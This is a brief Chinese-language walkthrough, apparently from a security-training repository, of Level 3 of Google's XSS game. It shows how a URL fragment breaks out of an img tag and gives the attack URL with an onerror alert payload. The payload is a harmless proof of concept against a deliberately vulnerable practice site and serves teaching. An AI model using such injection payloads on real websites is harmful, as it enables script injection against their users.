# Level-3

## 攻擊原理

#### 網頁原始碼:
- index.html

#### 偽造 img tag:
- 使最後渲染的程式碼變成

```html
<img src='/static/level3/cloud" + num + onerror="alert('done'); + ".jpg' />
```

## 攻擊方法
在網址利列中插入 'onerror="alert('done');"
```
https://xss-game.appspot.com/level3/frame#1'onerror="alert('done');"
```

## 截圖

#### Code: (page onload)
![image](https://github.com/yillkid/ntc-white-hat/assets/185872/67b7264a-d69c-4d7b-af1c-ee3d67b1988e)

#### 或 click:
![image info](./01.png)

#### Request:
![image info](./00.png)

#### Rsponse:
![image info](./01.png)
